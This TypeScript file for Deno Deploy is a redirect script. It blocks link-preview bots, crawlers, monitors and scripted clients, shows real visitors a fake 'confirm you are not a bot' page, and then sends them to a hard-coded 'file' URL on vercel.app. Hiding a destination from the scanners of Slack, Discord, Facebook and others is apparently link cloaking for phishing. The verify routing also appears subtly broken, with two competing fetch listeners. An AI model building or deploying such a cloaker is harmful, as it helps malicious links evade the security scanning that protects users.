// redirect.ts - Premium bot-mitigation + human-challenge redirect for Deno Deploy

// ====== CONFIG ======
const redirectUrl = "https://file-bt5g.vercel.app"; // <-- set your final URL (must include http(s)://)
const HUMAN_COOKIE = "is_human_v1";
const HUMAN_COOKIE_MAX_AGE = 60 * 60 * 6; // 6 hours - how long to remember human
const NONCE_TTL_MS = 60 * 1000; // nonce valid 60s
const RATE_LIMIT_WINDOW_MS = 60 * 1000; // 1 minute
const RATE_LIMIT_MAX = 30; // max requests per IP per window

// Simple in-memory stores (edge memory - ephemeral; ok for small scale)
const nonces = new Map<string, number>(); // nonce => expiry timestamp
const humanTokens = new Map<string, number>(); // token => expiry (for simple server-side recall)
const ipHits = new Map<string, { count: number; start: number }>();

// Known bot substrings in UA (lowercase)
const blockedBots = [
  "googlebot", "bingbot", "slackbot", "facebookexternalhit", "facebot",
  "twitterbot", "whatsapp", "linkedinbot", "skypeuripreview", "discordbot",
  "telegrambot", "python-requests", "curl", "ahrefsbot", "semrushbot",
  "mj12bot", "uptimerobot", "pingdom", "crawler", "spider", "bot"
];

// Main event listener
addEventListener("fetch", (event) => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request: Request): Promise<Response> {
  try {
    const ip = extractIP(request);
    rateLimit(ip);

    // Basic blocking: HEADs and suspicious methods
    if (request.method === "HEAD") {
      return new Response("Blocked", { status: 403 });
    }

    const ua = (request.headers.get("user-agent") || "").toLowerCase();
    const accept = request.headers.get("accept") || "";
    const secFetchMode = request.headers.get("sec-fetch-mode") || "";

    // Block known bots immediately
    for (const b of blockedBots) {
      if (ua.includes(b)) return new Response("Blocked", { status: 403 });
    }

    // If human cookie exists and token valid -> redirect
    const cookie = parseCookies(request.headers.get("cookie") || "");
    if (cookie[HUMAN_COOKIE] && humanTokens.has(cookie[HUMAN_COOKIE])) {
      // refresh expiration server-side
      humanTokens.set(cookie[HUMAN_COOKIE], Date.now() + HUMAN_COOKIE_MAX_AGE * 1000);
      return Response.redirect(redirectUrl, 302);
    }

    // Quick heuristics used by link-preview scanners:
    // - missing Accept: text/html
    // - Sec-Fetch-Mode absent (many real browsers include this)
    // - Accept includes "text/html" & sec-fetch-mode 'navigate' is a sign of real browser
    const looksLikeBrowser = accept.includes("text/html") && secFetchMode === "navigate";

    // If looks like a browser and not blocked - issue challenge page
    if (looksLikeBrowser) {
      return await serveChallengePage();
    }

    // Otherwise very suspicious (likely crawler / preview) -> block
    return new Response("Blocked", { status: 403 });
  } catch (err) {
    // fail-safe: don't reveal internals
    return new Response("Error", { status: 500 });
  }
}

// Serve the human challenge HTML which runs a small JS proof and posts /verify
async function serveChallengePage(): Promise<Response> {
  // create a one-time nonce stored server-side
  const nonce = cryptoRandomString(24);
  nonces.set(nonce, Date.now() + NONCE_TTL_MS);

  const html = challengeHtml(nonce);
  return new Response(html, {
    status: 200,
    headers: {
      "content-type": "text/html; charset=utf-8",
      "cache-control": "no-store, no-cache, must-revalidate",
    },
  });
}

// Verify endpoint: called by client JS after human interaction
addEventListener("fetch", (event) => {
  const req = event.request;
  const url = new URL(req.url);
  if (url.pathname === "/_verify" && req.method === "POST") {
    event.respondWith(handleVerify(req));
  }
});

// Handle verification posts
async function handleVerify(request: Request): Promise<Response> {
  try {
    const ip = extractIP(request);
    rateLimit(ip);

    const body = await request.json().catch(() => ({}));
    const { nonce, moved, ua } = body || {};

    // Basic validation
    if (!nonce || !nonces.has(nonce)) {
      return new Response(JSON.stringify({ ok: false, reason: "invalid nonce" }), { status: 400 });
    }
    const expiry = nonces.get(nonce)!;
    if (Date.now() > expiry) {
      nonces.delete(nonce);
      return new Response(JSON.stringify({ ok: false, reason: "nonce expired" }), { status: 400 });
    }

    // require human interaction (mouse/touch) - moved must be true
    if (!moved) {
      return new Response(JSON.stringify({ ok: false, reason: "no interaction" }), { status: 403 });
    }

    // Accept: create server token and set cookie
    const token = cryptoRandomString(32);
    humanTokens.set(token, Date.now() + HUMAN_COOKIE_MAX_AGE * 1000);
    // consume nonce
    nonces.delete(nonce);

    const res = new Response(JSON.stringify({ ok: true, redirect: true }), {
      status: 200,
      headers: {
        "content-type": "application/json",
        "set-cookie": `${HUMAN_COOKIE}=${token}; HttpOnly; Path=/; Max-Age=${HUMAN_COOKIE_MAX_AGE}; SameSite=Lax`,
      },
    });
    return res;
  } catch (e) {
    return new Response(JSON.stringify({ ok: false }), { status: 500 });
  }
}

// ===== Helpers =====

// Rate limiting per IP (simple sliding window)
function rateLimit(ip: string) {
  const now = Date.now();
  const rec = ipHits.get(ip);
  if (!rec || now - rec.start > RATE_LIMIT_WINDOW_MS) {
    ipHits.set(ip, { count: 1, start: now });
  } else {
    rec.count++;
    if (rec.count > RATE_LIMIT_MAX) {
      throw new Error("rate_limited");
    }
    ipHits.set(ip, rec);
  }
}

// Extract client IP from headers (best effort for proxies)
function extractIP(request: Request): string {
  const headers = request.headers;
  const xff = headers.get("x-forwarded-for");
  if (xff) {
    return xff.split(",")[0].trim();
  }
  // Deno Deploy sets a unique header, but if not present fallback:
  return headers.get("cf-connecting-ip") || headers.get("x-real-ip") || "unknown";
}

function parseCookies(cookieHeader: string) {
  const cookies: Record<string, string> = {};
  cookieHeader.split(";").forEach((c) => {
    const [k, ...v] = c.trim().split("=");
    if (!k) return;
    cookies[k] = decodeURIComponent(v.join("="));
  });
  return cookies;
}

// small secure random string
function cryptoRandomString(len = 24) {
  const bytes = crypto.getRandomValues(new Uint8Array(len));
  return Array.from(bytes).map((b) => b.toString(36).padStart(2, "0")).join("").slice(0, len);
}

// Minimal challenge HTML: requires a mousemove or touch, then posts /_verify with nonce + moved true
function challengeHtml(nonce: string) {
  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <meta name="robots" content="noindex,nofollow"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Verifying…</title>
  <style>
    html,body{height:100%;margin:0;font-family:system-ui,Segoe UI,Roboto,Helvetica,Arial}
    .wrap{display:flex;align-items:center;justify-content:center;height:100%;flex-direction:column;padding:20px;text-align:center}
    .btn{margin-top:12px;padding:10px 16px;border-radius:8px;border:1px solid #ddd;background:#fff;cursor:pointer}
    .spinner{width:36px;height:36px;border-radius:50%;border:4px solid #eee;border-top-color:#666;animation:spin 1s linear infinite}
    @keyframes spin{to{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="spinner" aria-hidden="true"></div>
    <h3>One more step — confirm you are not a bot</h3>
    <p>Move your mouse, tap the screen, or click the button below to continue.</p>
    <button id="go" class="btn">I'm not a bot</button>
  </div>

  <script>
    (function(){
      const nonce = "${nonce}";
      let moved = false;
      const btn = document.getElementById("go");

      function markHuman() {
        moved = true;
        attemptVerify();
      }

      function attemptVerify() {
        // Build a compact fingerprint (not invasive)
        const fingerprint = [
          navigator.userAgent || "",
          navigator.platform || "",
          (new Date()).getTimezoneOffset()
        ].join("|");

        fetch("/_verify", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ nonce, moved: !!moved, ua: navigator.userAgent, fp: fingerprint })
        }).then(r => r.json())
          .then(j => {
            if (j && j.ok) {
              // success: cookie already set by server; redirect to target
              window.location.href = "${redirectUrl}";
            } else {
              // show fallback message
              alert("Verification failed. Try again.");
            }
          }).catch(e => {
            console.error(e);
            alert("Network error during verification.");
          });
      }

      // events that indicate human
      window.addEventListener("mousemove", markHuman, { once: true, passive: true });
      window.addEventListener("touchstart", markHuman, { once: true, passive: true });
      btn.addEventListener("click", markHuman, { once: true });

      // fallback: after 4s if nothing, show button (already visible)
      setTimeout(()=>{ /* allow user to click manually */ }, 4000);
    })();
  </script>
</body>
</html>`;
}
